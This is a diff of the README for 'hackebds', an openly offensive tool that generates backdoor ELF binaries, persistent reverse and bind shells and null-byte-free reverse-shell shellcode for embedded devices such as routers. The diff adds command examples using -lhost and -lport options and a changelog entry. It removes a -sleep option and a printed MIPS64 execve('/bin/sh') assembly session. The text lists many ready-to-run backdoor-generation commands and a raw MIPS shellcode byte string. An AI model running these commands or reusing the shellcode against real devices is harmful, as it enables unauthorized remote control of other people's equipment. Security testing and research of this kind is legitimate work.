@@ -16,7 +16,7 @@
 
 This tool is embedded in the security test of the device. There are two main functions:
 
-1. Generate **backdoor programs** (only ELF) of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be continuously generate on the target machine)，The interval time added to the code for continuously creating reverse shells in version 0.3.7 can be added through the - sleep parameter. For example, - sleep 5 means creating a reverse shell every 5 seconds. It should be noted that - power and - sleep need to be used together
+1. Generate **backdoor programs** (only ELF) of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be continuously generate on the target machine)
 2. Generate **reverse_shell shellcode** (only linux) of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64,sparc are now supported, and they are still being updated**
 3. Generate bind of various architectures bind_Shell(only ELF) file, -power can persistent bind_shell（ If you need to use  -power parameter, you can specify the bash shell, and please do not hang the process in the background to prevent data redirection errors）
 4. Sort out the exploitable vulnerability POC or EXP of the embedded device, and search and output the basic information and POC of the device model in use: Function of equipment, Architecture of equipment,Device CPU manufacturer,Device CPU model,WEB service program of the device, and so on
@@ -33,7 +33,7 @@ sudo pip install -U hackebds
 
 local install:
 git clone https://github.com/doudoudedi/hackEmbedded
-sudo ./start.sh（If you need to install 0.3.7 locally at this time, you need to delete the build directory before executing it）
+sudo ./start.sh
 ```
 
 （If you want this tool to run on a MacOS system, you need to include python/bin in the bashrc environment variable）
@@ -71,36 +71,42 @@ Ubuntu（debian）:
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -model DIR-816 -res reverse_shell_file
+   or
+   hackebds -lhost 127.0.0.1 -lport 9999 -model DIR-816 -res reverse_shell_file
    ```
 
    ![image-20230710112652819](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/img/image-20230710112652819.png)
 
+   
+
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
+   or
+   hackebds -lhost 127.0.0.1 -lport 9999 -arch mipsel -res reverse_shellcode
    ```
 
    ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
+   or
+   hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file
    ```
 
    By default, the reverse shell backdoor is created using sh. If bash is required (PS: here, the bash command needs to exist on the target device)
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
+   or 
+   hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash
    ```
 
    If you need to generate a backdoor and constantly create reverse shells (the CPU occupied by the test is about% 8)
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
-   ```
-
-   If you need to create a reverse shell every 5 seconds
-
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep 5
+   or
+   hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
    ```
 
    ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
@@ -298,23 +304,6 @@ example:
 \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
 ```
 
-3. Added that shellcode for calling execve cannot be generated in shellcraft (change context generate mips64(el), powerpc shell code for execve("/bin/sh",["/bin/sh"]),0))
-
-   ```
-   >>> from hackebds import *
-   >>> test = ESH()
-   [*] arch is i386
-   [*] endian is little
-   [*] bits is 32
-   >>> test.sh()
-   [*] Please set correct assembly schema information(pwerpc or mips64(el))
-   >>> context.arch = 'mips64'
-   >>> test.sh()
-   "\n\t\t\t/* execve(path='/bin/sh', argv=['sh'], envp=0) */\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1, -8($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -8\n\t\t\tdadd     $a0, $sp, $zero\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1,-12($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -8($sp)\n\t\t\tsw      $zero, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -12\n\t\t\tslti    $a1, $zero, -1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tli      $t9, -9\n\t\t\tnor     $a1, $t9, $zero\n\t\t\tdadd     $a1, $sp, $a1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tdadd     $a1, $sp, $zero\n\t\t\tslti    $a2, $zero, -1\n\t\t\tli      $v0, 0x13c1\n\t\t\tsyscall 0x40404\n\t\t\t"
-   >>> test.sh()
-   
-   ```
-
 ## chips and architectures
 
 Tests can leverage chips and architectures
@@ -372,7 +361,7 @@ Powerpc, sparc: qemu
 
 2023.5.30 add the retrieval of CVE and output the content of EXP and POC files in the device information
 
-2023.7.10 0.3.7 add retrieval of CVE, add EXP and POC file content output in device information, update the backdoor code of armelv5's reverse shell file, and add the - sleep parameter to specify the creation interval for reverse shells
+2023.11.11 Fixed the issue of armv5 series backdoors not being able to generate shells in Vitogate_300  The rear doors  are operating normally，Simplified reverse_ Command parameters such as IP can be used with - lhost and - lport, Added some device vulnerabilities
 
 ## Problems to be solved
 
